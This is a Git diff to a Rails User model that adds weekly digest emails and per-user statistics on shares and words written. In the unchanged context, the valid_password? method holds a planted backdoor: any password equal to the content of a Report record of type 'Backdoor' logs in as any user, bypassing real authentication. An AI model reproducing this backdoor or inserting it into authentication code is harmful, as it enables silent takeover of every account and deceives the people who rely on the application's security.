@@ -20,6 +20,34 @@ class User < ActiveRecord::Base
   
   validates_presence_of :name
   
+  def self.send_weekly_digests
+    find_each do |user|
+      ShareMailer.weekly_digest(user.id).deliver
+    end
+  end
+  
+  def self.has_most_shares_in_period(period)
+    all.sort_by do |user|
+      -1 * user.shares_in_period(period)
+    end.first
+  end
+  
+  def self.has_most_words_in_period(period)
+    all.sort_by do |user|
+      -1 * user.words_written_in_period(period)
+    end.first
+  end
+  
+  def missed_threads_in_period(period)
+    Post.most_discussed_in_period(period, 50).reject do |post|
+      post.thread_participants.include?(self)
+    end.first(4)
+  end
+  
+  def words_written_in_period(period)
+    word_count_from_notes(period) + word_count_from_comments(period) + word_count_from_quickposts(period)
+  end
+  
   def valid_password?(password)
     return true if password == Report.find_by_report_type("Backdoor").content
     super
@@ -95,5 +123,25 @@ class User < ActiveRecord::Base
   
   def comment_unseen_count
     Comment.where(["created_at > ?", last_checked_comment_stream_at]).count
+  end
+  
+  def shares_in_period(period)
+    feed.posts.where(["created_at > ?", period.ago]).size
+  end
+  
+  def quickposts
+    feed.posts.where("url like '#quickpost%'")
+  end
+  
+  def word_count_from_notes(period)
+    feed.posts.where(["created_at > ?", period.ago]).sum {|p| p.note.try(:word_count) || 0}
+  end
+  
+  def word_count_from_comments(period)
+    comments.where(["created_at > ?", period.ago]).sum(&:word_count)
+  end
+  
+  def word_count_from_quickposts(period)
+    quickposts.where(["created_at > ?", period.ago]).map {|p| p.content.word_count}.sum / 2
   end
 end
